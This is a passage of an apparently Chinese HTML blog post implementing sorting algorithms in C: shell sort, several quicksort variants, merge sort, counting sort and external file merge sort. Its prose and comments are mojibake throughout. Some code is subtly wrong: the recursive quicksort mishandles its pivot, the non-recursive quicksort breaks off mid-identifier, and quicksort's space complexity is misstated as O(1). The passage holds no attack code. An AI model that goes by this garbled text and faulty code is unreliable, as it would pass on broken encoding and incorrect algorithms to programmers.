å®ç°:</h3>\n<details>\nç‚¹å‡»æŸ¥çœ‹ä»£ç \n<pre><code>void ShellSort(int* a, int size) {\n\t//å…ˆé¢„æ’åº,æŠŠå¤§çš„æ•°æ®å¾€åè¾¹æ”¾ï¼ŒæŠŠå°çš„æ•°æ®å¾€å‰æŒª\n\tint gap = size;//å½“gap=1æ—¶å°±è·Ÿæ’å…¥æ’åºæ˜¯ä¸€æ ·çš„\n\twhile (gap&gt;1) {\n\t\tgap = gap / 3 + 1;//åŠ 1çš„ç›®çš„æ˜¯ä¿è¯æœ€åä¸€æ¬¡gap=1ï¼Œä»è€Œå®ç°æ’å…¥æ’åº\n\t\tfor (int j = 0; j &lt; gap; j++) {\n\t\t\tfor (int i = j; i &lt; size - gap; i += gap) {\n\t\t\t\tint end = i;\n\t\t\t\tint tmp = a[end + gap];\n\t\t\t\twhile (end &gt;= 0) {\n\t\t\t\t\tif (a[end] &gt; tmp) {\n\t\t\t\t\t\ta[end + gap] = a[end];\n\t\t\t\t\t\tend -= gap;\n\t\t\t\t\t}\n\t\t\t\t\telse {\n\t\t\t\t\t\tbreak;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\ta[end + gap] = tmp;\n\t\t\t}//è¿™å±‚å¾ªç¯æ˜¯æ§åˆ¶ä»¥gapä¸ºä¸€ç»„çš„äº¤æ¢\n\t\t}//å¾ªç¯gapæ¬¡ï¼ŒæŠŠæ‰€æœ‰çš„ç»„éƒ½æ’å…¥äº¤æ¢ä¸€æ¬¡\n\t}//å¤šæ¬¡ä»¥ä¸åŒçš„gapå€¼é¢„æ’åºï¼Œæœ€ågap==1ï¼Œæ’å…¥æ’åº\n}\n</code></pre>\n</details>\n<h2 id=\"å¿«æ’\">å¿«æ’</h2>\n<h3 id=\"æ ¸å¿ƒæ€æƒ³-5\">æ ¸å¿ƒæ€æƒ³:</h3>\n<p><img alt=\"å±å¹•æˆªå›¾ 2026-01-20 143202\" class=\"lazyload\" /></p>\n<p><img alt=\"å±å¹•æˆªå›¾ 2026-01-20 151336\" class=\"lazyload\" /></p>\n<p>å•è¶Ÿå¿«æ’(ä»£ç å®ç°):</p><details><p></p>\nç‚¹å‡»æŸ¥çœ‹ä»£ç \n<pre><code>//éœå°”çš„å•è¶Ÿå¿«æ’\nint QuickSort1(int* a, int left, int right) {\n\tint mid = GetMid(a, left, right);\n\tint key = left;\n\tSwap(&amp;a[key], &amp;a[mid]);\n\tint begin = left;\n\tint end = right;\n\twhile (begin &lt; end) {\n\t\twhile (begin &lt; end &amp;&amp; a[end] &gt;= a[key]) {\n\t\t\tend--;\n\t\t}\n\t\twhile (begin &lt; end &amp;&amp; a[begin] &lt;= a[key]) {\n\t\t\tbegin++;\n\t\t}\n\t\tSwap(&amp;a[begin], &amp;a[end]);\n\t}\n\tSwap(&amp;a[key], &amp;a[begin]);\n\treturn begin;\n}\n\n//åŒæŒ‡é’ˆæ³•çš„å•è¶Ÿå¿«æ’\nint QuickSort2(int* a, int left,int right) {\n\tint key = left;\n\tint prev = left;\n\tint cur = left + 1;\n    //curæŒ‡é’ˆæ˜¯ä¸ºäº†æ‰¾æ¯”keyå°çš„æ•°ï¼Œæ‰¾åˆ°äº†å°±å…ˆ++prevç„¶åä¸preväº¤æ¢æ•°æ®ï¼Œcur++ï¼Œæ²¡æ‰¾åˆ°å°±cur++ï¼Œprevä¸åŠ¨    \n\twhile(cur&lt;=right) {\n\t\tif (a[cur] &lt; a[key] &amp;&amp; ++prev != cur) {\n\t\t\tSwap(&amp;a[cur], &amp;a[prev]);\n\t\t}\n\t\tcur++;\n\t}\n\tSwap(&amp;a[key], &amp;a[prev]);\n\treturn prev;\n}\n\n</code></pre>\n</details>\n<h3 id=\"ç‰¹ç‚¹-5\">ç‰¹ç‚¹:</h3>\n<p>ä¸ç¨³å®šæ’åºï¼Œæ—¶é—´å¤æ‚åº¦ä¸ºO(N*logN)ï¼Œç©ºé—´å¤æ‚åº¦ä¸ºO(1)</p>\n<h3 id=\"é€‚ç”¨åœºæ™¯-6\">é€‚ç”¨åœºæ™¯:</h3>\n<p>å†…å­˜ä¸­æ•°æ®çš„é«˜æ•ˆæ’åºï¼Œä¸”å¯¹æ’åºç¨³å®šæ€§æ²¡æœ‰è¦æ±‚</p>\n<h3 id=\"æ—¶é—´å¤æ‚åº¦-5\">æ—¶é—´å¤æ‚åº¦:</h3>\n<p>æ³¨:é»˜è®¤æƒ…å†µæ˜¯é€‰æœ€å·¦è¾¹çš„æ•°å­—ä½œä¸ºkey</p>\n<p>æœ€ä¼˜æƒ…å†µ:æ¯æ¬¡é€‰keyéƒ½é€‰åˆ°ä¸­é—´æ•°å­—ï¼Œå³æ¯æ¬¡ç­‰é•¿åˆ’åˆ†åŒºé—´</p>\n<p><img alt=\"å±å¹•æˆªå›¾ 2026-01-20 144035\" class=\"lazyload\" /><br />\næ­¤æ—¶å°±å¦‚åŒæ ‘ä¸€èˆ¬ï¼Œé€’å½’æ·±åº¦ä¸ºlogNï¼Œæ¯å±‚éƒ½éœ€è¦éå†ä¸€éï¼Œæ—¶é—´ä¸ºO(N)ï¼Œæ•…æ—¶é—´å¤æ‚åº¦ä¸ºO(N*logN)</p>\n<p>æœ€åæƒ…å†µ:æ¯æ¬¡éƒ½é€‰åˆ°æœ€å¤§æˆ–è€…æœ€å°çš„æ•°ä½œä¸ºkeyï¼Œæ¯æ¬¡åˆ’åˆ†ä¼šå¾—åˆ°é•¿åº¦ä¸ºn-1å’Œ0çš„å­æ•°ç»„ï¼Œæ­¤æ—¶é€’å½’çš„å±‚æ•°ä¸ºNå±‚ï¼Œæ¯å±‚æ—¶é—´ä¸ºO(N)ï¼Œæ•…æ—¶é—´å¤æ‚åº¦ä¸ºO(N^2)<br />\nç”±æ­¤å¯è§:é€‰keyæ˜¯é‡ä¸­ä¹‹é‡ï¼Œä¸‹é¢ä»‹ç»ä¸¤ç§æ–¹å¼ä¼˜åŒ–é€‰keyçš„æ–¹å¼<br />\n1ã€éšæœºæ•°é€‰key:åˆ©ç”¨éšæœºæ•°é€‰keyï¼Œæå¤§æ¦‚ç‡ä¸Šé¿å…äº†keyé€‰åˆ°æç«¯å€¼(æœ€å¤§æˆ–æœ€å°)çš„æƒ…å†µ<br />\n2ã€ä¸‰è¾“å–ä¸­æ³•é€‰key:ä»æœ€å·¦è¾¹å’Œæœ€å³è¾¹å’Œä¸­é—´é€‰ä¸€ä¸ªä¸­é—´çš„æ•°ï¼Œè¿™æ ·æ°¸è¿œä¸å¯èƒ½é€‰åˆ°æœ€å°æˆ–æœ€å¤§çš„æ•°äº†<br />\nä»£ç å®ç°:</p><details><p></p>\nç‚¹å‡»æŸ¥çœ‹ä»£ç \n<pre><code>int GetMid(int*a,int left, int right) {\n\tint mid = (left + right) / 2;\n\tif (a[left] &gt; a[right]) {\n\t\tif (a[right] &gt; a[mid])\n\t\t\treturn right;\n\t\telse if (a[mid] &gt; a[left])\n\t\t\treturn left;\n\t\telse\n\t\t\treturn mid;\n\t}\n\telse {\n\t\tif (a[left] &gt; a[mid])\n\t\t\treturn left;\n\t\telse if (a[mid] &gt; a[right])\n\t\t\treturn right;\n\t\telse\n\t\t\treturn mid;\n\t}\n}\n\n</code></pre>\n</details>\n<h3 id=\"ä»£ç å®ç°-5\">ä»£ç å®ç°:</h3>\n<p>é€’å½’ç‰ˆ:</p>\n<details>\nç‚¹å‡»æŸ¥çœ‹ä»£ç \n<pre><code>void QuickSort(int* a, int left, int right) {\n\tif (left &gt;= right)\n\t\treturn;\n\t//å°åŒºé—´ä¼˜åŒ–ï¼Œå¦‚æœæœ€ååªå‰©å‡ ä¸ªå€¼äº†ï¼Œå¦‚æœç»§ç»­é€’å½’å°±ä¼šæ¯”è¾ƒæµªè´¹æ—¶é—´äº†ã€‚è¿™ä¸ªæ—¶å€™å¯ä»¥è°ƒç”¨å…¶ä»–å‡½æ•°æ¥æ’è¿™å‡ ä¸ªæ•°\n\tif (right - left + 1 &lt; 10) {\n\t\tInsertSort(a + left, right - left + 1);//è¿™é‡Œæ˜¯å¯¹a+leftä»¥åçš„æ•°æ®è¿›è¡Œæ’åºï¼Œæ‰€ä»¥è¦åŠ leftï¼Œæ³¨æ„\n\t}\n\telse {\n\t\tint mid = GetMid(a, left, right);//è¿™æ˜¯ä¸ºäº†å¤„ç†é¡ºåºçš„æƒ…å†µï¼Œå¦‚æœä½¿é¡ºåºçš„è¯ï¼Œå®ƒä¼šä¸æ–­æ‹†åˆ†æˆä¸€ä¸ªï¼Œç„¶åå›å½’ï¼Œæ‰€ä»¥è¦ä½¿keyä¸èƒ½æœ€å¤§ä¹Ÿä¸èƒ½æœ€å°\n\t\tint key = mid;\n\t\tSwap(&amp;a[key], &amp;a[mid]);\n\t\tint begin = left;\n\t\tint end = right;\n\t\twhile (begin &lt; end) {\n\t\t\twhile (begin &lt; end &amp;&amp; a[end] &gt;= a[key]) {\n\t\t\t\tend--;\n\t\t\t}\n\t\t\twhile (begin &lt; end &amp;&amp; a[begin] &lt;= a[key]) {\n\t\t\t\tbegin++;\n\t\t\t}\n\t\t\tSwap(&amp;a[begin], &amp;a[end]);\n\t\t}\n\t\tSwap(&amp;a[begin], &amp;a[key]);\n\t\t//åˆ†ä¸ºä¸‰ä¸ªåŒºé—´: [key,begin-1] begin == end [end+1,right] \n\t\tQuickSort(a, left, begin - 1);\n\t\tQuickSort(a, end + 1, right);\n\t}\n}\n</code></pre>\n</details>\n<p>éé€’å½’ç‰ˆ:<br />\nç”¨æ ˆæ¥æ¨¡æ‹Ÿé€’å½’çš„å®ç°:åˆ©ç”¨æ ˆçš„ç‰¹æ€§(åè¿›å…ˆå‡º)æ¥ä¿å­˜å·¦å³åŒºé—´</p>\n<details>\nç‚¹å‡»æŸ¥çœ‹ä»£ç \n<pre><code>#include \"Stack.h\"\n//æ ˆçš„å®ç°è¯¦æƒ…è¯·çœ‹ä¸Šä¸€æœŸ\nvoid QuickSortNonR(int* a, int left, int right) {\n\t//ç”¨æ ˆæ¥ä¿å­˜åŒºé—´\n\tST st;\n\tSTinit(&amp;st);\n\tSTpush(&amp;st, right);\n\tSTpush(&amp;st, left);\n        //æ ˆä¸­æ²¡æœ‰åŒºé—´äº†æ‰åœä¸‹æ¥\n\twhile (!STempty(&amp;st)) {\n\t\tint begin = STtop(&amp;st);\n\t\tSTpop(&amp;st);\n\t\tint end = STtop(&amp;st);\n\t\tSTpop(&amp;st);\n\t\tint key = QuickSort2(a,begin,end);\n\t\t//è¿™é‡Œåˆ†æˆçš„æ˜¯[begin,key - 1] key [key + 1,end]\n\t\tif (key + 1 &lt; end) {//å°äºçš„æ˜¯end,æ¯æ¬¡éƒ½ä¸ä¸€æ ·\n                        //pushæ–°çš„å·¦å³åŒºé—´\n\t\t\tSTpush(&amp;st, end);\n\t\t\tSTpush(&amp;st, key + 1);\n\t\t}\n\t\tif ((key - 1) &gt; begin) {\n\t\t\tSTpush(&amp;st, key - 1);\n\t\t\tSTpush(&amp;st, begin);\n\t\t}\n\t}\n\tSTdes\n</code></pre>\n</details>\n<h3 id=\"å¿«æ’çš„è‡´å‘½ç—›ç‚¹\">å¿«æ’çš„è‡´å‘½ç—›ç‚¹:</h3>\n<p><img alt=\"å±å¹•æˆªå›¾ 2026-01-20 195855\" class=\"lazyload\" /></p>\n<p>ä»£ç å®ç°:</p>\n<details>\nç‚¹å‡»æŸ¥çœ‹ä»£ç \n<pre><code>//å¿«æ’çš„ä¸‰è·¯åˆ’åˆ†\nvoid QuickSort3(int* a,int left,int right) {\n\tif (left &gt;= right)\n\t\treturn;\n\tint begin = left;\n\tint key = a[left];\n\tint end = right;\n\tint cur = begin + 1;\n\twhile (cur &lt;= end) {\n\t\tif (a[cur] &lt; key) {\n\t\t\tSwap(&amp;a[cur], &amp;a[begin]);\n\t\t\tcur++;\n\t\t\tbegin++;\n\t\t}\n\t\telse if (a[cur] == key) \n\t\t\tcur++;\n\t\telse {\n\t\t\tSwap(&amp;a[cur], &amp;a[end]);\n\t\t\tend--;\n\t\t}\n\t}\n\t//æ­¤æ—¶åˆ†ä¸ºä¸‰ä¸ªåŒºé—´[left,begin-1] [begin,end] [end+1,right]\n\tQuickSort3(a, left, begin - 1);\n\tQuickSort3(a, end+1,right);\n}\n</code></pre>\n</details>\n<h2 id=\"å½’å¹¶æ’åº\">å½’å¹¶æ’åº</h2>\n<h3 id=\"æ ¸å¿ƒæ€æƒ³-6\">æ ¸å¿ƒæ€æƒ³:</h3>\n<p>æ— é™çš„äºŒåˆ†æ•°ç»„ï¼Œç›´åˆ°ä¸¤ä¸¤æœ‰åº(åªæœ‰ä¸€ä¸ªå€¼)ç„¶åå¼€å§‹å½’å¹¶<br />\n<img alt=\"å±å¹•æˆªå›¾ 2026-01-20 154555\" class=\"lazyload\" /></p>\n<h3 id=\"ç‰¹ç‚¹-6\">ç‰¹ç‚¹:</h3>\n<p>ç¨³å®šæ’åºï¼Œæ—¶é—´å¤æ‚åº¦ä¸ºO(N*logN)ï¼Œç©ºé—´å¤æ‚åº¦ä¸ºO(N)</p>\n<h3 id=\"é€‚ç”¨åœºæ™¯-7\">é€‚ç”¨åœºæ™¯:</h3>\n<p>éœ€è¦ç¨³å®šæ’åºï¼Œæ•°æ®é‡è¾ƒå¤§ï¼Œæˆ–æ•°æ®å­˜å‚¨åœ¨å¤–éƒ¨å­˜å‚¨å™¨ä¸­</p>\n<h3 id=\"æ—¶é—´å¤æ‚åº¦-6\">æ—¶é—´å¤æ‚åº¦:</h3>\n<p>ç”±äºå®ƒåŸºæœ¬ä¸Šæ˜¯å‡åˆ†æ•°ç»„ï¼Œæ˜¯å®Œå…¨äºŒå‰æ ‘ï¼Œé€’å½’æ·±åº¦ä¸ºlogNå±‚ï¼Œæ¯å±‚éƒ½éœ€è¦éå†ä¸€è¾¹ï¼Œæ—¶é—´ä¸ºO(N)ï¼Œæ•…æ—¶é—´å¤æ‚åº¦ä¸ºO(N*logN)</p>\n<h3 id=\"ä»£ç å®ç°-6\">ä»£ç å®ç°:</h3>\n<p>é€’å½’ç‰ˆ:</p>\n<details>\nç‚¹å‡»æŸ¥çœ‹ä»£ç \n<pre><code>void _MergeSort(int* a, int* tmp, int left, int right) {\n\t//å½“åªæœ‰ä¸€ä¸ªå€¼äº†å°±æœ‰åºäº†\n\tif (left &gt;= right) {\n\t\treturn;\n\t}\n\tint mid = (left + right) / 2;\n        //æ³¨æ„:è¿™é‡Œé€‰åŒºé—´æœ‰å‘ï¼Œåªèƒ½è¿™ä¹ˆé€‰\n\tint begin1 = left, end1 = mid;\n\tint begin2 = mid + 1, end2 = right;\n\t_MergeSort(a, tmp, begin1, end1);\n\t_MergeSort(a, tmp, begin2, end2);\n\t//å½“ä¸¤ä¸ªæ•°ç»„æœ‰åºçš„æ—¶å€™\n\tint i = begin1;//æ¯æ¬¡çš„iæ˜¯ä»begin1å¼€å§‹çš„\n\t//åªè¦æœ‰ä¸€ä¸ªèµ°å®Œäº†å°±ç»“æŸäº†\n\twhile (begin1 &lt;= end1 &amp;&amp; begin2 &lt;= end2) {\n\t\tif (a[begin1] &lt; a[begin2]) {\n\t\t\ttmp[i++] = a[begin1++];\n\t\t}\n\t\telse {\n\t\t\ttmp[i++] = a[begin2++];\n\t\t}\n\t}\n\twhile (begin2 &lt;= end2) {//è¦å–ç­‰å·ï¼Œå¦åˆ™å•å€¼ä¼šæ¼æ‰\n\t\ttmp[i++] = a[begin2++];\n\t}\n\twhile (begin1 &lt;= end1) {\n\t\ttmp[i++] = a[begin1++];\n\t}\n\tmemcpy(a + left, tmp + left, sizeof(int) * (right - left + 1));//å½’å¹¶å®Œäº†è¦æ‹·è´å›å»,æ¯æ¬¡èµ·ç‚¹ä¸ä¸€æ ·\n}\nvoid MergeSort(int* a, int size) {\n\tint* tmp = (int*)malloc(sizeof(int) * size);\n\tif (tmp == NULL) {\n\t\tperror(\"malloc fail\");\n\t\treturn;\n\t}//æ¯æ¬¡mallocå®Œéƒ½è¦æ£€éªŒï¼Œå¦‚æœä¸å¼€å­å‡½æ•°ï¼Œæ¯æ¬¡é€’å½’çš„æ—¶å€™éƒ½ä¼šmallocä¸€ä¸ªæ•°ç»„ï¼Œæµªè´¹ç©ºé—´\n\t_MergeSort(a, tmp, 0,size - 1);\n\n\tfree(tmp);\n\ttmp = NULL;\n}\n\n</code></pre>\n</details>\né€‰åŒºé—´æ—¶çš„å‘:\n<p><img alt=\"å±å¹•æˆªå›¾ 2026-01-20 155743\" class=\"lazyload\" /><br />\néé€’å½’ç‰ˆ:</p>\n<details>\nç‚¹å‡»æŸ¥çœ‹ä»£ç \n<pre><code>void MergeSortNonR(int* a, int size) {\n\tint* tmp = (int*)malloc(sizeof(int) * size);\n\tif (tmp == NULL) {\n\t\tperror(\"malloc fail\");\n\t\treturn;\n\t}//æ¯æ¬¡mallocå®Œéƒ½è¦æ£€éªŒ\n\tint gap = 1;//gapæ˜¯æ¯ç»„çš„ä¸ªæ•°ï¼Œä»ä¸€ä¸ªå¼€å§‹ï¼Œå› ä¸ºåªæœ‰ä¸€ä¸ªè‚¯å®šæœ‰åº\n\twhile (gap &lt; size) {\n\t\tint j = 0;\n\t\t//ä»ä¸€ ä¸€å¼€å§‹æ’ï¼Œç„¶åè¿‡æ¸¡åˆ°ä¸¤ä¸¤å¼€å§‹ï¼Œæ˜¯ç”±gapæ¥æ§åˆ¶çš„\n\t\tfor (int i = 0; i &lt; size; i += 2 * gap) {\n\t\t\tint begin1 = i, end1 = i + gap - 1;\n\t\t\tint begin2 = i + gap, end2 = i + 2 * gap - 1;\n\t\t\t//å› ä¸ºæ­¤æ—¶åªæœ‰[begin1,end1]å·²ç»æ˜¯æœ‰åºäº†,ä¸éœ€è¦å†å½’å¹¶äº†\n\t\t\tif (begin2 &gt;= size)\n\t\t\t\tbreak;\n\t\t\t//å¤„ç†end2è¶Šç•Œçš„é—®é¢˜ï¼Œå…ˆæŠŠend2æ”¹æˆsize-1å†å½’å¹¶ï¼Œè¿™æ ·å°±å˜æˆäº†[begin1,end1]ä¸[begin2,size-1]çš„å½’å¹¶\n\t\t\tif (end2 &gt;= size)\n\t\t\t\tend2 = size - 1;\n\t\t\t//åªè¦æœ‰ä¸€ä¸ªèµ°å®Œäº†å°±ç»“æŸäº†\n\t\t\twhile (begin1 &lt;= end1 &amp;&amp; begin2 &lt;= end2) {\n\t\t\t\tif (a[begin1] &lt; a[begin2]) {\n\t\t\t\t\ttmp[j++] = a[begin1++];\n\t\t\t\t}\n\t\t\t\telse {\n\t\t\t\t\ttmp[j++] = a[begin2++];\n\t\t\t\t}\n\t\t\t}\n\t\t\twhile (begin2 &lt;= end2) {//è¦å–ç­‰å·ï¼Œå¦åˆ™å•å€¼ä¼šæ¼æ‰\n\t\t\t\ttmp[j++] = a[begin2++];\n\t\t\t}\n\t\t\twhile (begin1 &lt;= end1) {\n\t\t\t\ttmp[j++] = a[begin1++];\n\t\t\t}\n\t\t\t//éœ€è¦ä¸€æ®µä¸€æ®µæ‹·è´ï¼ŒåŸå› :å½“begin2 &gt;= sizeçš„æ—¶å€™æ­¤æ—¶çš„end2å·²ç»è¶…å‡ºsize-1äº†æ‹·è´çš„æ•°é‡å°±ä¸å¯¹äº†\n\t\t\tmemcpy(a + i, tmp + i, sizeof(int) * (end2 - i + 1));\n\t\t}\n\t\tprintf(\"\\n\");\n\t\tgap *= 2;\n\t}\n\tfree(tmp);\n\ttmp = NULL;\n}\n</code></pre>\n</details>\nä»£ç å®ç°ä¸­çš„å‘:\n<p><img alt=\"å±å¹•æˆªå›¾ 2026-01-20 161642\" class=\"lazyload\" /></p>\n<h2 id=\"è®¡æ•°æ’åº\">è®¡æ•°æ’åº</h2>\n<h3 id=\"æ ¸å¿ƒæ€æƒ³-7\">æ ¸å¿ƒæ€æƒ³:</h3>\n<p>æ–°å¼€ä¸€ä¸ªæ•°ç»„ï¼Œç”¨æ–°æ•°ç»„çš„ä¸‹æ ‡æ¥è¡¨ç¤ºåŸæ•°ç»„çš„æ•°æ®ï¼Œéå†ä¸€éåŸæ•°ç»„ï¼Œæ¯é‡åˆ°åŸæ•°ç»„ä¸­çš„æ•°æ®ï¼Œæ–°æ•°ç»„å¯¹åº”çš„ä¸‹æ ‡çš„å€¼å°±++ï¼Œç„¶åå†éå†ä¸€è¾¹æ–°æ•°ç»„ï¼ŒæŠŠæ–°æ•°ç»„çš„å€¼æ‹·è´å›åŸæ•°ç»„</p>\n<h3 id=\"ç‰¹ç‚¹-7\">ç‰¹ç‚¹:</h3>\n<p>éæ¯”è¾ƒæ’åºï¼Œæ—¶é—´å¤æ‚åº¦ä¸ºO(N + range)ï¼Œç©ºé—´å¤æ‚åº¦ä¸ºO(N)</p>\n<h3 id=\"é€‚ç”¨åœºæ™¯-8\">é€‚ç”¨åœºæ™¯:</h3>\n<p>æ•°æ®ç±»å‹é›†ä¸­ï¼Œæ•°å€¼èŒƒå›´è¿œå°äºæ•°æ®é‡(æ­¤æ—¶æ—¶é—´å¤æ‚åº¦ä¸ºO(N))</p>\n<h3 id=\"æ—¶é—´å¤æ‚åº¦-7\">æ—¶é—´å¤æ‚åº¦:</h3>\n<p>ä¸¤æ¬¡éå†ï¼Œåˆ†åˆ«ä¸ºO(N),O(range)ï¼Œæ•…æ—¶é—´å¤æ‚åº¦ä¸ºO(N+range)</p>\n<h3 id=\"ä»£ç å®ç°-7\">ä»£ç å®ç°:</h3>\n<details>\nç‚¹å‡»æŸ¥çœ‹ä»£ç \n<pre><code>void CountSort(int* a, int size) {\n\t//å…ˆéå†ä¸€éæ‰¾åˆ°æœ€å°å€¼å’Œæœ€å¤§å€¼(ç›¸å¯¹æ˜ å°„)\n\tint mini = a[0], maxi = a[0];\n\tfor (int i = 0; i &lt; size; i++) {\n\t\tif (a[i] &lt; mini)\n\t\t\tmini = a[i];\n\t\tif (a[i] &gt; maxi)\n\t\t\tmaxi = a[i];\n\t}\n\tint range = maxi - mini + 1;\n\t//callocè‡ªåŠ¨åˆå§‹åŒ–ä¸º0\n\t//å¦‚æœç”¨mallocéœ€è¦ç”¨memsetæ‰‹åŠ¨åˆå§‹åŒ–ä¸º0\n\tint* tmp = (int*)calloc(range,sizeof(int));\n\tif (tmp == NULL) {\n\t\tperror(\"calloc fail\");\n\t\treturn;\n\t}\n\t//æ”¾å…¥tmpä¸‹æ ‡ä¸­\n\tfor (int i = 0; i &lt; size; i++) {\n\t\t//ç›¸å¯¹æ˜ å°„ï¼Œè‹¥ç›´æ¥æ˜ å°„ä¼šæµªè´¹å¤ªå¤šç©ºé—´\n\t\ttmp[a[i] - mini]++;\n\t}\n\t//æ‹·è´å›åŸæ•°ç»„\n\tint j = 0;\n\tfor (int i = 0; i &lt; range; i++) {\n\t\twhile (tmp[i]--) {\n\t\t\ta[j++] = i + mini;\n\t\t}\n\t}\n\tfree(tmp);\n\ttmp = NULL;\n}\n</code></pre>\n</details>\nç›¸å¯¹æ˜ å°„:\nå…ˆéå†å‡ºåŸæ•°ç»„çš„æœ€å¤§å€¼ä¸æœ€å°å€¼ï¼Œä»è€Œå†³å®šæ–°æ•°ç»„çš„å¤§å°ï¼ŒåŸæ•°ç»„çš„æ•°æ®-minå€¼å°±æ˜¯æ–°æ•°ç»„å¯¹åº”çš„ä¸‹æ ‡\n<h2 id=\"å½’å¹¶æ’åºçš„å¤–æ’åº\">å½’å¹¶æ’åºçš„å¤–æ’åº</h2>\n<h3 id=\"é€‰å½’å¹¶çš„åŸå› \">é€‰å½’å¹¶çš„åŸå› :</h3>\n<p>å› ä¸ºå…¶ä»–çš„æ’åºéƒ½æ˜¯ç”¨æ•°ç»„å­˜å‚¨æ•°æ®ï¼Œè¦ç”¨ä¸‹æ ‡å»è®¿é—®æ•°æ®ï¼Œä½†åœ¨ç£ç›˜æ–‡ä»¶ä¸­ä¸æ–¹ä¾¿è®¿é—®ï¼Œéœ€è¦è¯»å†™æ–‡ä»¶æ¥è®¿é—®ï¼Œé€Ÿåº¦ææ…¢</p>\n<h3 id=\"æ ¸å¿ƒæ€è·¯\">æ ¸å¿ƒæ€è·¯:</h3>\n<p>å°†ä¸€ä¸ªå¤§æ–‡ä»¶çš„æ•°æ®æ”¾åˆ°file1å’Œfile2ä¸¤ä¸ªå°æ–‡ä»¶ä¸­å»ï¼Œå¹¶ç”¨æ’åºç®—æ³•æ’æˆæœ‰åºï¼Œç„¶åç”¨å½’å¹¶ç®—æ³•å°†file1å’Œfile2åˆæˆæœ‰åºçš„å¤§æ–‡ä»¶mfileï¼Œåˆ é™¤file1å’Œfile2ï¼Œå°†mfileæ”¹åä¸ºfile1ï¼Œç„¶åç»§ç»­è¯»æ–‡ä»¶åˆ°file2ä¸­ï¼Œç»§ç»­å½’å¹¶â€¦â€¦</p>\n<h3 id=\"ä»£ç å®ç°-8\">ä»£ç å®ç°:</h3>\n<details>\nç‚¹å‡»æŸ¥çœ‹ä»£ç \n<pre><code>//æ–‡ä»¶çš„å¤–æ’åº(ç”¨å½’å¹¶æ’åºå®ç°)\n\n//è®¾ç½®éšæœºçš„æ•°\nvoid FileSet() {\n\tconst char* filename = \"data.txt\";\n\tFILE* file = fopen(filename, \"w\");\n\tif (file == NULL) {\n\t\tperror(\"fopen fail\");\n\t\treturn;\n\t}\n\t//å†™å…¥éšæœºæ•°æ®\n\tint size = 1000000;\n\tfor (int i = 0; i &lt; size; i++) {\n\t\tfprintf(file, \"%d\\n\", rand() + i);\n\t}\n\tfclose(file);\n}\n\n//æŠŠæ–‡ä»¶ä¸­çš„æ•°è¯»å…¥æ–°æ–‡ä»¶ä¸­ï¼Œå¹¶æ’åº\n//è¿”å›å®é™…è¯»åˆ°çš„æ•°æ®ä¸ªæ•°\nint ReadNDataSortToFile(FILE* file, int n, const char* name) {\n\t//è¦æ˜¯æ¯æ¬¡éƒ½æ‰“å¼€æ–‡ä»¶çš„è¯æ–‡ä»¶æŒ‡é’ˆåˆä¼šé‡å¤´å¼€å§‹äº†,æ‰€ä»¥è¦æå‰æ‰“å¼€\n\tFILE* file1 = fopen(name, \"w\");\n\tif (file1 == NULL) {\n\t\tperror(\"fopen fail\");\n\t\treturn 0;\n\t}\n\t//æŠŠåŸæ–‡ä»¶è¯»å…¥ä¸´æ—¶çš„æ•°ç»„ä¸­\n\tint* a = (int*)calloc(n, sizeof(int));\n\tif (a == NULL) {\n\t\tperror(\"calloc fail\");\n\t\treturn 0;\n\t}\n\tint index = 0;//å› ä¸ºæ­¤æ—¶ä¸ä¸€å®šèƒ½è¯»æ»¡nä¸ª\n\tint x = 0;\n\tfor (int i = 0; i &lt; n; i++) {\n\t\tif (fscanf(file, \"%d\", &amp;x)==EOF)\n\t\t\tbreak;\n\t\ta[index++] = x;//indexæ­¤æ—¶æ˜¯ä¸ªæ•°\n\t}\n\tif (index == 0) {\n\t\tfree(a);\n\t\ta = NULL;//ä¸€å®šè¦freeæ‰ï¼Œä¸ç„¶ä¼šå†…å­˜æ³„éœ²\n\t\treturn 0;\n\t}\n\t//å°†æ•°ç»„aæ’åº\n\tQuickSortNonR(a, 0, index-1);//ä»»æ„æ’åºå‡å¯\n\t//ç„¶åæŠŠæ•°ç»„ä¸­çš„å€¼å†™å…¥file1ä¸­\n\tfor (int i = 0; i &lt; index; i++) {\n\t\tfprintf(file1, \"%d\\n\", a[i]);\n\t}\n\tfclose(file1);\n\tfree(a);\n\ta = NULL;\n\treturn index;\n}\n\n//å°†ä¸¤ä¸ªæœ‰åºçš„æ–‡ä»¶å½’å¹¶åœ¨ä¸€èµ·\nvoid MergeSortToFile(const char* file1name, const char* file2name,const char* mfilename) {\n\tFILE* file1 = fopen(file1name, \"r\");\n\tif (file1 == NULL) {\n\t\tperror(\"fopen fail\");\n\t\treturn;\n\t}FILE* file2 = fopen(file2name, \"r\");\n\tif (file2 == NULL) {\n\t\tperror(\"fopen fail\");\n\t\treturn;\n\t}\n\tFILE* mfile = fopen(mfilename, \"w\");\n\tif (mfile == NULL) {\n\t\tperror(\"fopen fail\");\n\t\treturn;\n\t}\n\t//å°†file1å’Œfile2å½’å¹¶åœ¨ä¸€èµ·\n\tint x1;\n\tint x2;\n\tint ret1 = fscanf(file1, \"%d\", &amp;x1);\n\tint ret2 = fscanf(file2, \"%d\", &amp;x2);\n\twhile (ret1 !=EOF &amp;&amp; ret2!=EOF) {//è¿™é‡Œçš„ret1å’Œret2è¦æ›´æ–°\n\t\tif (x1&lt;x2) {\n\t\t\tfprintf(mfile, \"%d\\n\", x1);//è¦åŠ æ¢è¡Œ\n\t\t\tret1 = fscanf(file1, \"%d\", &amp;x1);\n\t\t}\n\t\telse {\n\t\t\tfprintf(mfile, \"%d\\n\", x2);\n\t\t\tret2 = fscanf(file2, \"%d\", &amp;x2);\n\t\t}\n\t}\n\twhile (ret1 != EOF) {\n\t\tfprintf(mfile, \"%d\\n\", x1);\n\t\tret1 = fscanf(file1, \"%d\", &amp;x1);\n\t}\n\twhile (ret2!= EOF) {\n\t\tfprintf(mfile, \"%d\\n\", x2);\n\t\tret2 = fscanf(file2, \"%d\", &amp;x2);\n\t}\n\tfclose(file1);\n\tfclose(file2);\n\tfclose(mfile);\n}\n\nvoid FileTest() {\n\tsrand((unsigned int)time(NULL));\n\tFileSet();\n\tconst char* filename = \"data.txt\";\n\tFILE* file = fopen(filename, \"r\");\n\tif (file == NULL) {\n\t\tperror(\"fopen fail\");\n\t\treturn;\n\t}\n\t//å°†è¿™æ–‡ä»¶çš„æ•°æ®å†™å…¥file1å’Œfile2ä¸­ï¼Œåˆ†åˆ«æ’åºï¼Œç„¶åå½’å¹¶åœ¨ä¸€èµ·\n\tconst char* file1 = \"file1.txt\";\n\tconst char* file2 = 